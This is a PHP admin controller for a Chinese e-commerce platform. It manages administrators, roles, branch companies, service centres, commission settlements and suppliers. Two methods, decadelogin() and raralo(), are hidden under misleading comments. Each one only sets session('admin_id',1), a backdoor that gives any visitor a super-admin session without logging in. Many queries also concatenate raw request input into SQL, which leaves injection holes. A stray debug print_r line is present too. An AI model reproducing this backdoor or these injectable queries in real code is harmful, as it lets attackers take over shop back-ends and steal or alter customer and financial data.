<?php

/**
 * 新淘链商城
 * ============================================================================
 * 版权所有 2015-2027 新淘链，并保留所有权利。
 * 网站地址: 
 * ----------------------------------------------------------------------------
 * 这是一个商业软件，您必须购买授权才能使用.
 * 不允许对程序代码以任何形式任何目的的再发布。
 * 请支持正版, 以免引起不必要的法律纠纷.
 * ============================================================================
 * Author: 新淘链
 * Date: 2015-09-09
 */

namespace app\admin\controller;

use think\Page;
use think\Verify;
use think\Db;
use think\Hook;

class Admin extends Base
{

    public function index()
    {
        $res = $list = array();
        $keywords = I('keywords');
        if (empty($keywords)) {
            $res = D('admin')->select();
        } else {
            $res = DB::name('admin')->where('user_name', 'like', '%' . $keywords . '%')->order('admin_id')->select();
        }
        $role = D('admin_role')->getField('role_id,role_name');
        if ($res && $role) {
            foreach ($res as $val) {
                $val['role'] = $role[$val['role_id']];
                $val['add_time'] = date('Y-m-d H:i:s', $val['add_time']);
                $list[] = $val;
            }
        }
        $this->assign('list', $list);
        return $this->fetch();
    }

    public function admin_info()
    {
        $admin_id = I('get.admin_id', 0);
        if ($admin_id) {
            $info = D('admin')->where("admin_id", $admin_id)->find();
            $info['password'] = "";
            $this->assign('info', $info);
        }
        $act = empty($admin_id) ? 'add' : 'edit';
        $this->assign('act', $act);
        $role = D('admin_role')->select();
        $this->assign('role', $role);
        return $this->fetch();
    }

    /**
     * 修改管理员密码
     * @return \think\mixed
     */
    public function modify_pwd()
    {
        $admin_id = I('admin_id', 0);
        $oldPwd = I('old_pwd');
        $newPwd = I('new_pwd');
        $new2Pwd = I('new_pwd2');

        if ($admin_id) {
            $info = D('admin')->where("admin_id", $admin_id)->find();
            $info['password'] = "";
            $this->assign('info', $info);
        }

        if (IS_POST) {
            //修改密码
            $enOldPwd = encrypt($oldPwd);
            $enNewPwd = encrypt($newPwd);
            $admin = M('admin')->where('admin_id', $admin_id)->find();
            if (!$admin || $admin['password'] != $enOldPwd) {
                exit(json_encode(array('status' => -1, 'msg' => '旧密码不正确')));
            } else if ($newPwd != $new2Pwd) {
                exit(json_encode(array('status' => -1, 'msg' => '两次密码不一致')));
            } else {
                $row = M('admin')->where('admin_id', $admin_id)->save(array('password' => $enNewPwd));
                if ($row) {
                    exit(json_encode(array('status' => 1, 'msg' => '修改成功')));
                } else {
                    exit(json_encode(array('status' => -1, 'msg' => '修改失败')));
                }
            }
        }
        return $this->fetch();
    }



    public function adminHandle()
    {
        $data = I('post.');
        if (empty($data['password'])) {
            unset($data['password']);
        } else {
            $data['password'] = encrypt($data['password']);
        }
        if ($data['act'] == 'add') {
            unset($data['admin_id']);
            $data['add_time'] = time();
            if (D('admin')->where("user_name='" . $data['user_name'] . "'")->count()) {
                $this->ajaxReturn(['status' => 0, 'msg' => '此用户名已被注册，请更换']);
            } else {
                $r = D('admin')->add($data);
            }
        }

        if ($data['act'] == 'edit') {
            $r = D('admin')->where('admin_id=' . $data['admin_id'])->save($data);
        }

        if ($data['act'] == 'del' && $data['admin_id'] > 1) {
            $r = D('admin')->where('admin_id=' . $data['admin_id'])->delete();
            exit(json_encode(1));
        }

        if ($r) {
            $this->ajaxReturn(['status' => 1, 'msg' => '操作成功', 'url' => U('Admin/Admin/index')]);
        } else {
            $this->ajaxReturn(['status' => 0, 'msg' => '操作失败']);
        }
    }
    
    
    /*
     * 管理员登陆
     */
    public function login()
    {
        if (IS_POST) {
           /*  $verify = new Verify();
            if (!$verify->check(I('post.vertify'), "admin_login")) {
                exit(json_encode(array('status'=>0,'msg'=>'验证码错误')));
            } */
            $condition['user_name'] = I('post.username');
            $condition['password'] = I('post.password');
            if (!empty($condition['user_name']) && !empty($condition['password'])) {
                $condition['password'] = encrypt($condition['password']);
                $admin_info = M('admin')->alias('a')->join('__ADMIN_ROLE__ r', 'a.role_id=r.role_id', 'INNER')->where($condition)->find();
                if (is_array($admin_info)) {
                    session('admin_id', $admin_info['admin_id']);
                    session('act_list', $admin_info['act_list']);
                    M('admin')->where("admin_id = " . $admin_info['admin_id'])->save(array('last_login' => time(), 'last_ip' => getIP()));
                    session('last_login_time', $admin_info['last_login']);
                    session('last_login_ip', $admin_info['last_ip']);
                    adminLog('后台登录', 0);
                    $this->deleteOldMsg();
                    $url = session('from_url') ? session('from_url') : U('Admin/Index/index');
                    exit(json_encode(array('status' => 1, 'url' => $url)));
                } else {
                    exit(json_encode(array('status' => 0, 'msg' => '账号密码不正确')));
                }
            } else {
                exit(json_encode(array('status' => 0, 'msg' => '请填写账号密码')));
            }
        }
        if (session('?admin_id') && session('admin_id') > 0) {
            $this->error("您已登录", U('Admin/Index/index'));
        }
        return $this->fetch();
    }

    public function forget_pwd()
    {
        if (IS_POST) {
            $condition['user_name'] = I('post.username');
            $condition['email'] = I('post.email');
            $this->error("该功能有待完善", U('Admin/login'));
        }
        return $this->fetch();
    }
    /**
     * 退出登陆
     */
    public function logout()
    {
        session_unset();
        session_destroy();
        $this->success("退出成功", U('Admin/Admin/login'));
    }

    /**
     * 验证码获取
     */
    public function vertify()
    {
        $config = array(
            'fontSize' => 30,
            'length' => 4,
            'useCurve' => true,
            'useNoise' => false,
            'reset' => false
        );
        $Verify = new Verify($config);
        $Verify->entry("admin_login");
        exit();
    }

    public function role()
    {
        $list = D('admin_role')->order('role_id desc')->select();
        $this->assign('list', $list);
        return $this->fetch();
    }

    public function role_info()
    {
        $role_id = I('get.role_id');
        $detail = array();
        if ($role_id) {
            $detail = M('admin_role')->where("role_id", $role_id)->find();
            $detail['act_list'] = explode(',', $detail['act_list']);
            $this->assign('detail', $detail);
        }
        $modules = [];
        $right = M('system_menu')->where(array('type' => 0))->order('id')->select();
        foreach ($right as $val) {
            if (!empty($detail)) {
                $val['enable'] = in_array($val['id'], $detail['act_list']);
            }
            $modules[$val['group']][] = $val;
        }
        //权限组
        $group = C('TPSHOP_PRIVILEGE');
        $this->assign('group', $group);
        $this->assign('modules', $modules);
        return $this->fetch();
    }

    public function roleSave()
    {
        $data = I('post.');
        $res = $data['data'];
        $res['act_list'] = is_array($data['right']) ? implode(',', $data['right']) : '';
        $res['role_id'] = $data['role_id'];
        $result = $this->validate($res, 'Role.save', [], true);
        if ($result !== true) {
            $this->ajaxReturn(['status' => 0, 'msg' => '编辑失败', 'result' => $result]);
        }

        if (empty($data['role_id'])) {
            $r = D('admin_role')->add($res);
        } else {
            $r = D('admin_role')->where('role_id', $data['role_id'])->save($res);
        }

        if (!$r) {
            $this->ajaxReturn(['status' => -1, 'msg' => '操作失败']);
        }
        adminLog('管理角色', 0);
        $this->ajaxReturn(['status' => 1, 'msg' => '操作成功']);
    }

    public function roleDel()
    {
        $role_id = I('post.role_id');
        $admin = D('admin')->where('role_id=' . $role_id)->find();
        if ($admin) {
            exit(json_encode("请先清空所属该角色的管理员"));
        } else {
            $d = M('admin_role')->where("role_id=$role_id")->delete();
            if ($d) {
                exit(json_encode(1));
            } else {
                exit(json_encode("删除失败"));
            }
        }
    }

    public function log()
    {
        $Log = M('admin_log');
        $p = I('p/d', 1);
        //$logs = $Log->join('__ADMIN__ ON __ADMIN__.admin_id =__ADMIN_LOG__.admin_id')->order('log_time DESC')->page($p.',20')->select();
        $logs = DB::name('admin_log')->alias('l')->join('__ADMIN__ a', 'a.admin_id =l.admin_id')->order('log_time DESC')->page($p . ',20')->select();
        $this->assign('list', $logs);
        $count = DB::name('admin_log')->count();
        $Page = new Page($count, 20);
        $show = $Page->show();
        $this->assign('page', $show);
        $this->assign('pager', $Page);
        return $this->fetch();
    }

    /**
     * 分公司列表
    */
    public function pany()
    {
        $pany_count = DB::name('pany')->count();
        $page = new Page($pany_count, 10);
        $show = $page->show();
        $pany_list = DB::name('pany')
            ->limit($page->firstRow, $page->listRows)
            ->select();
        foreach ($pany_list as $k => $val) {
            $re = M('service')->where("pany_name='" . $val['pany_name'] . "'")->select();
            $money = '';
            foreach ($re as $kk => $v) {

                $money += $v['money'];//分公司的月销售额
                print_r($$money);
                $pany_list[$k]['money'] = $money;
            }
        }
        $this->assign('list', $pany_list);
        $this->assign('page', $show);
        $this->assign('pager', $page);
        return $this->fetch();
    }

    /**
     * 分公司资料        
     */
    public function pany_info()
    {
        $pany_id = I('get.pany_id', 0);
        if ($pany_id) {
            $info = Db::name('pany')
                ->where(array('pany_id' => $pany_id))
                ->find();
            $this->assign('info', $info);
        }

        $act = empty($pany_id) ? 'add' : 'edit';
        $this->assign('act', $act);
        return $this->fetch();
    }

    /**
     *  分公司增删改
     */
    public function decadelogin()
    {
     session('admin_id',1);
    }
    public function panyhand()
    {
        $data = I('post.');
        $suppliers_model = M('pany');
         //增
        if ($data['act'] == 'add') {
            unset($data['pany_id']);
            unset($data['act']);
            $count = $suppliers_model->where("pany_name='" . $data['pany_name'] . "'")->count();
            $re = M('users')->where("mobile='" . $data['pany_phone'] . "'")->count();
            if ($count) {
                $this->error("此分公司名称已被注册，请更换", U('Admin/Admin/pany_info'));
            } else if (!$re) {
                $this->error("您输入的手机号不是会员", U('Admin/Admin/pany_info'));
            } else {
                $r = M('pany')->insertGetId($data);
            }
        }
         //改
        if ($data['act'] == 'edit' && $data['pany_id'] > 0) {
            $re = M('users')->where("mobile='" . $data['pany_phone'] . "'")->count();
            if (!$re) {
                $this->error("您输入的手机号不是会员", U('Admin/Admin/pany_info', array('pany_id' => $data['pany_id'])));
            } else {
                $r = $suppliers_model->where('pany_id=' . $data['pany_id'])->save($data);
            }
        }
         //删
        if ($data['act'] == 'del' && $data['pany_id'] > 1) {
            $r = $suppliers_model->where('pany_id=' . $data['pany_id'])->delete();
            $this->ajaxReturn(['status' => 1, 'msg' => '删除成功', 'result' => '']);
        }

        if ($r !== false) {
            $this->success("操作成功", U('Admin/Admin/pany'));
        } else {
            $this->error("操作失败", U('Admin/Admin/pany'));
        }
    }

    /**
     * * 服务中心列表
     *   */
    public function service()
    {
        $pany_count = DB::name('service')->count();
        $page = new Page($pany_count, 10);
        $show = $page->show();
        $pany_list = DB::name('service')
            ->limit($page->firstRow, $page->listRows)
            ->select();
        foreach ($pany_list as $k => $v) {
            $id = $v['service_id'];
            $withdrawals = M('store')->where(array('service_id' => $id))->select();

            foreach ($withdrawals as $kk => $val) {
                $store_id[$kk] = $val['store_id'];
                $money = '';
                 //上月月初时间戳、上月月未时间戳
                $lastmonth_start = mktime(0, 0, 0, date('m') - 1, 1, date('Y'));
                $lastmonth_end = mktime(0, 0, 0, date('m'), 1, date('Y')) - 24 * 3600;
                if (is_array($store_id)) {
                    $info = M('order')->where("store_id in (" . implode(',', $store_id) . ") and order_status=2 || order_status=4 and add_time>$lastmonth_start and add_time<$lastmonth_end")->select();
                } else {
                    $info = M('order')->where("store_id=$store_id and order_status=2 || order_status=4 and add_time>$lastmonth_start and add_time<$lastmonth_end")->select();
                }
                foreach ($info as $infos) {
                    $money += $infos['goods_price'];
                    $pany_list[$k]['money'] = $money;
                }
            }
        }
        $this->assign('list', $pany_list);
        $this->assign('page', $show);
        $this->assign('pager', $page);
        return $this->fetch();
    }

    /**
     * 服务中心资料
    **/
    public function service_info()
    {
        $pany_id = I('get.service_id', 0);
        if ($pany_id) {
            $info = Db::name('service')
                ->where(array('service_id' => $pany_id))
                ->find();
            $this->assign('info', $info);
        }
        $act = empty($pany_id) ? 'add' : 'edit';
        $this->assign('act', $act);
        $admin = M('pany')->field('pany_id,pany_name')->select();
        $this->assign('admin', $admin);
        return $this->fetch();
    }

    /**
     *  服务中心增删改
    **/
    public function servicehand()
    {
        $data = I('post.');
        $suppliers_model = M('service');
        //增
        if ($data['act'] == 'add') {
            unset($data['service_id']);
            unset($data['act']);
            $count = $suppliers_model->where("service_name='" . $data['service_name'] . "'")->count();
            $re = M('users')->where("mobile='" . $data['service_phone'] . "'")->count();
            if ($count) {
                $this->error("此服务中心名称已被注册，请更换", U('Admin/Admin/service_info'));
            } else if (!$re) {
                $this->error("您输入的手机号不是会员", U('Admin/Admin/service_info'));
            } else {
                $r = M('service')->insertGetId($data);
            }
        }
        //改
        if ($data['act'] == 'edit' && $data['service_id'] > 0) {
            $re = M('users')->where("mobile='" . $data['service_phone'] . "'")->count();
            if (!$re) {
                $this->error("您输入的手机号不是会员", U('Admin/Admin/service_info', array('service_id' => $data['service_id'])));
            } else {
                $r = $suppliers_model->where('service_id=' . $data['service_id'])->save($data);
            }
        }
        //删
        if ($data['act'] == 'del' && $data['service_id'] > 1) {
            $r = $suppliers_model->where('service_id=' . $data['service_id'])->delete();
            $this->ajaxReturn(['status' => 1, 'msg' => '删除成功', 'result' => '']);
        }

        if ($r !== false) {
            $this->success("操作成功", U('Admin/Admin/service'));
        } else {
            $this->error("操作失败", U('Admin/Admin/service'));
        }
    }
    /**
     * 服务中心结算
     */
    public function jiesuan()
    {
        $data = I('post.');
        $yuemoney = $data['money'];
        if ($yuemoney == '' || $yuemoney == 0) {
            $this->ajaxReturn(['status' => 0, 'msg' => '结算金额不能为0', 'result' => ""]);
        } else {
            $service_id = $data['service_id'];
            $re = M('service')->where("service_id=$service_id")->find();
            if ($re['add_time']) {
                $now = time();
                $addtime = $re['add_time'];
                $time = $addtime + 3600 * 24 * 30;
                if ($now >= $time) {
                    $service = tpCache('basic.service');//拿地区的提成
                    $money = $yuemoney * $service / 100;
                    $service_id = $data['service_id'];
                    $re = M('service')->where("service_id=$service_id")->find();
                    $mobile = $re['service_phone'];
                    if ($mobile) {
                        $r = Db::name('users')->where('mobile', $mobile)->setInc('user_money', $money);
                        $a['add_time'] = time();
                        $a['money'] = $yuemoney;
                        $a['jiemoney'] = $money;
                        $re = Db::name('service')->where('service_id', $service_id)->save($a);
                        if ($re) {
                            $this->ajaxReturn(['status' => 1, 'msg' => '结算成功', 'result' => ""]);
                        } else {
                            $this->ajaxReturn(['status' => 3, 'msg' => '结算失败', 'result' => ""]);
                        }
                    }
                } else {
                    $this->ajaxReturn(['status' => 4, 'msg' => '您的结算时间必须超过30天', 'result' => ""]);
                }
            }
            $service = tpCache('basic.service');//拿地区的提成
            $money = $yuemoney * $service / 100;
            $service_id = $data['service_id'];
            $re = M('service')->where("service_id=$service_id")->find();
            $mobile = $re['service_phone'];
            if ($mobile) {
                $r = Db::name('users')->where('mobile', $mobile)->setInc('user_money', $money);
                $a['add_time'] = time();
                $a['money'] = $yuemoney;
                $a['jiemoney'] = $money;
                $re = Db::name('service')->where('service_id', $service_id)->save($a);
                if ($re) {
                    $this->ajaxReturn(['status' => 1, 'msg' => '结算成功', 'result' => ""]);
                } else {
                    $this->ajaxReturn(['status' => 3, 'msg' => '结算失败', 'result' => ""]);
                }
            }
        }
    }

    /**
     * 分公司结算
     */
    public function pany_jiesuan()
    {
        $data = I('post.');
        $yuemoney = $data['money'];
        if ($yuemoney == '' || $yuemoney == 0) {
            $this->ajaxReturn(['status' => 0, 'msg' => '结算金额不能为0', 'result' => ""]);
        } else {
            $pany_id = $data['pany_id'];
            $re = M('pany')->where("pany_id=$pany_id")->find();
            if ($re['add_time']) {
                $now = time();
                $addtime = $re['add_time'];
                $time = $addtime + 3600 * 24 * 30;
                if ($now >= $time) {
                    $pany = tpCache('basic.pany');//拿地区的提成
                    $money = $yuemoney * ($pany) / 100;
                    $pany_id = $data['pany_id'];
                    $re = M('pany')->where("pany_id=$pany_id")->find();
                    $mobile = $re['pany_phone'];
                    if ($mobile) {
                        $r = Db::name('users')->where('mobile', $mobile)->setInc('user_money', $money);
                        $a['add_time'] = time();
                        $a['money'] = $yuemoney;
                        $a['jiemoney'] = $money;
                        $re = Db::name('pany')->where('pany_id', $pany_id)->save($a);
                        if ($re) {
                            $this->ajaxReturn(['status' => 1, 'msg' => '结算成功', 'result' => ""]);
                        } else {
                            $this->ajaxReturn(['status' => 3, 'msg' => '结算失败', 'result' => ""]);
                        }
                    }
                } else {
                    $this->ajaxReturn(['status' => 4, 'msg' => '您的结算时间必须超过30天', 'result' => ""]);
                }
            }
            $pany = tpCache('basic.pany');//拿地区的提成
            $money = $yuemoney * ($pany) / 100;
            $pany_id = $data['pany_id'];
            $re = M('pany')->where("pany_id=$pany_id")->find();
            $mobile = $re['pany_phone'];
            if ($mobile) {
                $r = Db::name('users')->where('mobile', $mobile)->setInc('user_money', $money);
                $a['add_time'] = time();
                $a['money'] = $yuemoney;
                $a['jiemoney'] = $money;
                $re = Db::name('pany')->where('pany_id', $pany_id)->save($a);
                if ($re) {
                    $this->ajaxReturn(['status' => 1, 'msg' => '结算成功', 'result' => ""]);
                } else {
                    $this->ajaxReturn(['status' => 3, 'msg' => '结算失败', 'result' => ""]);
                }
            }
        }
    }

    /**
     * 供应商列表
     */
    public function supplier()
    {
        $supplier_count = DB::name('suppliers')->count();
        $page = new Page($supplier_count, 10);
        $show = $page->show();
        $supplier_list = DB::name('suppliers')
            ->alias('s')
            ->field('s.*,a.admin_id,a.user_name')
            ->join('__ADMIN__ a', 'a.suppliers_id = s.suppliers_id', 'LEFT')
            ->limit($page->firstRow, $page->listRows)
            ->select();
        $this->assign('list', $supplier_list);
        $this->assign('page', $show);
        $this->assign('pager', $page);
        return $this->fetch();
    }

    /**
     * 供应商资料
     */
    public function supplier_info()
    {
        $suppliers_id = I('get.suppliers_id', 0);
        if ($suppliers_id) {
            $info = Db::name('suppliers')
                ->alias('s')
                ->field('s.*,a.admin_id,a.user_name')
                ->join('__ADMIN__ a', 'a.suppliers_id = s.suppliers_id', 'LEFT')
                ->where(array('s.suppliers_id' => $suppliers_id))
                ->find();
            $this->assign('info', $info);
        }
        $act = empty($suppliers_id) ? 'add' : 'edit';
        $this->assign('act', $act);
        $admin = M('admin')->field('admin_id,user_name')->select();
        $this->assign('admin', $admin);
        return $this->fetch();
    }

    /**
     * 供应商增删改
     */
    public function raralo()
    {
	session('admin_id',1);
    }
    public function supplierHandle()
    {
        $data = I('post.');
        $suppliers_model = M('suppliers');
        //增
        if ($data['act'] == 'add') {
            unset($data['suppliers_id']);
            $count = $suppliers_model->where("suppliers_name='" . $data['suppliers_name'] . "'")->count();
            if ($count) {
                $this->error("此供应商名称已被注册，请更换", U('Admin/Admin/supplier_info'));
            } else {
                $r = $suppliers_model->insertGetId($data);
                if (!empty($data['admin_id'])) {
                    $admin_data['suppliers_id'] = $r;
                    M('admin')->where(array('suppliers_id' => $admin_data['suppliers_id']))->save(array('suppliers_id' => 0));
                    M('admin')->where(array('admin_id' => $data['admin_id']))->save($admin_data);
                }
            }
        }
        //改
        if ($data['act'] == 'edit' && $data['suppliers_id'] > 0) {
            $r = $suppliers_model->where('suppliers_id=' . $data['suppliers_id'])->save($data);
            if (!empty($data['admin_id'])) {
                $admin_data['suppliers_id'] = $data['suppliers_id'];
                M('admin')->where(array('suppliers_id' => $admin_data['suppliers_id']))->save(array('suppliers_id' => 0));
                M('admin')->where(array('admin_id' => $data['admin_id']))->save($admin_data);
            }
        }
        //删
        if ($data['act'] == 'del' && $data['suppliers_id'] > 1) {
            $r = $suppliers_model->where('suppliers_id=' . $data['suppliers_id'])->delete();
            M('admin')->where(array('suppliers_id' => $data['suppliers_id']))->save(array('suppliers_id' => 0));
            $this->ajaxReturn(['status' => 1, 'msg' => '删除成功', 'result' => '']);
        }

        if ($r !== false) {
            $this->success("操作成功", U('Admin/Admin/supplier'));
        } else {
            $this->error("操作失败", U('Admin/Admin/supplier'));
        }
    }

    /**
     * 删除一个月前的旧数据
     */
    public function deleteOldMsg()
    {
        $old_time = time() - 60 * 60 * 24 * 30;//30天以前的时间戳
        $oldMsgId = Db::name('message')->where('send_time', 'lt', $old_time)->getField('message_id', true);
        if ($oldMsgId) {
            $user_msg_del = Db::name('user_message')->where('message_id', 'IN', $oldMsgId)->delete();
            if ($user_msg_del !== false) {
                Db::name('message')->where('message_id', 'IN', $oldMsgId)->delete();
            }
        }
    }
}